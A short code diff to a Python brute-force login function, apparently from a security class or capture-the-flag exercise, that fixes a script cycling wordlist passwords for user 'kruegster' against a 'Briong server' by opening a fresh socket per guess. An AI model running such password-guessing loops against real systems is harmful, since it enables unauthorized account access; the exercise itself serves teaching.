@@ -54,7 +54,7 @@ def brute_force():
             through each possible password and repeatedly attempt to login to
             the Briong server.
     """
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
 
 
     wordlistFile = open(wordlist)
@@ -62,6 +62,7 @@ def brute_force():
     username = "kruegster"  # Hint: use OSINT
 
     for word in wordlistFile:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((host, port))
         password = word  # Hint: use wordlist
 
@@ -69,6 +70,8 @@ def brute_force():
         s.send(password + "\n")
         data = s.recv(1024)
         print(data)
+
+
 
     wordlistFile.close()
 
